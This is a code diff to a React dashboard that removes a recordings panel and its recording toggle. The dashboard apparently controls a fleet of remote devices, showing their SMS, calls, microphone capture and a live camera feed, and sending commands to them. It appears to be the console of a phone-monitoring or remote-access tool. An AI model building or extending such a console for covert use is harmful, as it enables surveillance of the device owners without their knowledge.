@@ -4,7 +4,6 @@ import { DeviceInfoPanel } from './components/dashboard/DeviceInfoPanel';
 import { NetworkProfile } from './components/dashboard/NetworkProfile';
 import { SMSPanel } from './components/dashboard/SMSPanel';
 import { CallsPanel } from './components/dashboard/CallsPanel';
-import { RecordingsPanel } from './components/dashboard/RecordingsPanel';
 import { EventLog } from './components/dashboard/EventLog';
 import { CameraLiveFeed } from './components/dashboard/CameraLiveFeed';
 import { DeviceFleetList } from './components/dashboard/DeviceFleetList';
@@ -22,7 +21,6 @@ function App() {
   webRTCRef.current = webRTC;
   const [cameraFrame, setCameraFrame] = useState(null);
   const [isCameraLive, setIsCameraLive] = useState(false);
-  const [isRecording, setIsRecording] = useState(false);
   const [now, setNow] = useState(new Date());
 
   // Live clock
@@ -63,7 +61,6 @@ function App() {
     selectedDeviceId,
     feed,
     photos,
-    recordings,
     setSelectedDeviceId,
     sendCommand
   } = useDashboard(handleAudioData, handleWebRTCMessage, handleCameraFrame);
@@ -92,10 +89,6 @@ function App() {
     } else if (cmd === 'camera_live_stop') {
       setIsCameraLive(false);
       setCameraFrame(null);
-    } else if (cmd === 'start_record') {
-      setIsRecording(true);
-    } else if (cmd === 'stop_record') {
-      setIsRecording(false);
     }
     sendCommandRef.current(cmd, extra);
   }, []);
@@ -223,7 +216,6 @@ function App() {
                   <StatusTag label="Internet" value={health?.internetOnline === false ? 'Down' : 'Up'} tone={health?.internetOnline === false ? 'bad' : 'good'} />
                   <StatusTag label="Mic" value={health?.micCapturing ? 'Capturing' : 'Idle'} tone={health?.micCapturing ? 'good' : 'neutral'} />
                   <StatusTag label="Camera" value={isCameraLive ? 'Live' : 'Standby'} tone={isCameraLive ? 'warn' : 'neutral'} />
-                  <StatusTag label="Recording" value={isRecording ? 'On' : 'Off'} tone={isRecording ? 'warn' : 'neutral'} />
                 </div>
               </div>
             </div>
@@ -263,7 +255,7 @@ function App() {
               <div className="xl:col-span-2">
                 <GlassCard>
                   <SectionLabel>Controls</SectionLabel>
-                  <ControlButtons onCommand={handleCommand} health={selectedDevice?.health} isStreaming={isStreaming} isRecording={isRecording} isWebRtcActive={isWebRtcActive} isCameraLive={isCameraLive} />
+                  <ControlButtons onCommand={handleCommand} health={selectedDevice?.health} isStreaming={isStreaming} isWebRtcActive={isWebRtcActive} isCameraLive={isCameraLive} />
                 </GlassCard>
               </div>
             </div>
@@ -275,9 +267,8 @@ function App() {
               <CallsPanel calls={selectedDevice?.calls || []} />
             </div>
 
-            {/* ── Bottom row: Recordings + Event Log ─────────────────────────── */}
+            {/* ── Bottom row: Event Log ─────────────────────────── */}
             <div className="grid grid-cols-1 lg:grid-cols-2 gap-5">
-              <RecordingsPanel recordings={recordings} />
               <EventLog events={feed} />
             </div>
           </>}
